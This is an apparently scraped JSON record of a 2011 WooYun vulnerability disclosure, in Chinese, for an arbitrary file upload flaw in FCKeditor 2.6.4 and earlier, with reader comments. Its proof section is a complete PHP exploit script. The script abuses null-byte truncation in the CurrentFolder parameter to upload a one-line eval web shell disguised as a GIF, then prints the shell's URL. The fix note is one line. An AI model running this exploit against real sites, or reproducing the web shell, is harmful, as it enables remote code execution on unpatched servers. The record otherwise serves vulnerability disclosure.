{"id": 23288, "wybug_id": "wooyun-2011-01684", "wybug_title": "fckeditor &lt;= 2.6.4 任意文件上传漏洞", "wybug_corp": "fckeditor", "wybug_author": "我勒个去", "wybug_date": "2011-03-22 14:09", "wybug_open_date": "2011-03-22 14:18", "wybug_type": "文件上传导致任意代码执行", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "未联系到厂商或者厂商积极忽略", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["截断"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2011-03-22：\t积极联系厂商并且等待厂商认领中，细节不对外公开\t\t\t\t\t\t\t\t\t2011-03-22：\t厂商已经主动忽略漏洞，细节向公众公开  简要描述： fckeditor <= 2.6.4 任意文件上传漏洞, php coldfunsion应该KO了，asp表示很淡定，其他语言版本未测 详细说明：  currentfolder过滤不给力啊，但是GPC就能让它脑残   漏洞证明：  \n<?error_reporting(0);set_time_limit(0);ini_set(\"default_socket_timeout\", 5);define(STDIN, fopen(\"php://stdin\", \"r\"));$match = array();function http_send($host, $packet){\t$sock = fsockopen($host, 80);\twhile (!$sock)\t{\t\tprint \"\\n[-] No response from {$host}:80 Trying again...\";\t\t$sock = fsockopen($host, 80);\t}\tfputs($sock, $packet);\twhile (!feof($sock)) $resp .= fread($sock, 1024);\tfclose($sock);\tprint $resp;\treturn $resp;}function connector_response($html){\tglobal $match;\treturn (preg_match(\"/OnUploadCompleted\\((\\d),\\\"(.*)\\\"\\)/\", $html, $match) && in_array($match[1], array(0, 201)));}print \"\\n+------------------------------------------------------------------+\";print \"\\n| FCKEditor Servelet Arbitrary File Upload Exploit by Wolegequ     |\";print \"\\n+------------------------------------------------------------------+\\n\";if ($argc < 3){\tprint \"\\nUsage......: php $argv[0] host path\\n\";\tprint \"\\nExample....: php $argv[0] localhost /\\n\";\tprint \"\\nExample....: php $argv[0] localhost /FCKEditor/\\n\";\tdie();}$host = $argv[1];$path = ereg_replace(\"(/){2,}\", \"/\", $argv[2]);$filename  = \"fvck.gif\";$foldername = \"fuck.php%00.gif\";$connector = \"editor/filemanager/connectors/php/connector.php\";$payload  = \"-----------------------------265001916915724\\r\\n\";$payload .= \"Content-Disposition: form-data; name=\\\"NewFile\\\"; filename=\\\"{$filename}\\\"\\r\\n\";$payload .= \"Content-Type:  image/jpeg\\r\\n\\r\\n\";$payload .= 'GIF89a'.\"\\r\\n\".'<?php eval($_POST[a]) ?>'.\"\\n\";$payload .= \"-----------------------------265001916915724--\\r\\n\";$packet\t = \"POST {$path}{$connector}?Command=FileUpload&Type=Image&CurrentFolder=\".$foldername.\" HTTP/1.0\\r\\n\";//print $packet;$packet\t.= \"Host: {$host}\\r\\n\";$packet .= \"Content-Type: multipart/form-data; boundary=---------------------------265001916915724\\r\\n\";$packet .= \"Content-Length: \".strlen($payload).\"\\r\\n\";$packet .= \"Connection: close\\r\\n\\r\\n\";$packet .= $payload;print $packet;if (!connector_response(http_send($host, $packet))) die(\"\\n[-] Upload failed!\\n\");else print \"\\n[-] Job done! try http://${host}/$match[2] \\n\";?>\n   修复方案：  参见2.6.4.1修复   版权声明：转载请注明来源 我勒个去@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 未能联系到厂商或者厂商积极拒绝 漏洞Rank：12 (WooYun评价)  ", "replys": "漏洞评价：\n评论\n     2011-03-22 14:19 |    \t\txsser  \t\t\t( 普通白帽子  |\t\t\t        Rank:254 漏洞数:18        | 当我又回首一切,这个世界会好吗?)\t\t \n  拜    \n     2011-03-22 17:26 |    \t\tJacks \t\t\t( 普通白帽子  |\t\t\t        Rank:162 漏洞数:25        | ╮(╯▽╰)╭ 情何以堪  http://royalhack....)\t\t \n  这个code怎么那么熟悉？不是EgiX 写的那个？    \n     2011-03-22 18:21 |    \t\tm0r5 \t\t\t( 路人 |\t\t\t        Rank:30 漏洞数:6        )\t\t \n  这不是是EgiX 写的那个？    \n     2011-03-23 00:49 |    \t\t霍家二爷 \t\t\t( 实习白帽子  |\t\t\t        Rank:63 漏洞数:7        | 我撸管这么牛逼还是没妞喜欢我)\t\t \n  http://seclists.org/pen-test/2010/Jul/0截断呀截断    \n     2012-10-25 23:36 |    \t\tG8dSnow \t\t\t( 路人 |\t\t\t        Rank:21 漏洞数:5        | 一直在学习技术、分享知识的路上)\t\t \n  截断各处中招，xss和文件操作都有。。。伤不起。。。    \n  \n\n\n", "wybug_level_fromcorp": "未能联系到厂商或者厂商积极拒绝", "wybug_rank_fromcorp": 12, "Ranks": null}